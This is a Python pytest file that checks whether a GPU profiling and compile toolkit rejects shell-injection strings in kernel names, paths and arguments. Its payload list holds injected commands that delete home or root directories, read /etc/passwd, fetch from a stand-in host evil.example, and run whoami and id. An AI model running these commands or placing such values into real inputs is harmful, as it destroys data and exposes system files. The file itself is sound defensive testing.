"""Red-team: shell injection via kernel names, compile flags, rocprofv3 args."""

from pathlib import Path
from unittest import mock

import pytest

from perfxpert.tools import patch_mgr, profile_runner, compile_runner
from perfxpert.tools._safety import ShellMetacharError


SHELL_PAYLOADS = [
    "kernel;rm -rf ~",
    "kernel|cat /etc/passwd",
    "kernel&&curl evil.example/payload",
    "kernel$(whoami)",
    "kernel`id`",
    "kernel\nrm -rf /",
]


@pytest.mark.parametrize("payload", SHELL_PAYLOADS)
def test_patch_apply_rejects_shell_metachars_in_path(payload, tmp_path: Path):
    (tmp_path / "ok.cpp").write_text("// hi\n")
    with pytest.raises(ShellMetacharError):
        patch_mgr.apply(tmp_path, payload, "new\n")


@pytest.mark.parametrize("payload", SHELL_PAYLOADS)
def test_profile_run_rejects_shell_metachars_in_target(payload, tmp_path: Path):
    with pytest.raises(ShellMetacharError):
        profile_runner.run(
            argv=["rocprofv3", "--sys-trace", "--", payload],
            cwd=tmp_path,
        )


@pytest.mark.parametrize("payload", SHELL_PAYLOADS)
def test_compile_build_rejects_shell_metachars_in_source(payload, tmp_path: Path):
    (tmp_path / "ok.cpp").write_text("int main(){return 0;}\n")
    with pytest.raises(ShellMetacharError):
        compile_runner.build(
            project_root=tmp_path,
            source_rel=payload,
            flags=[],
        )
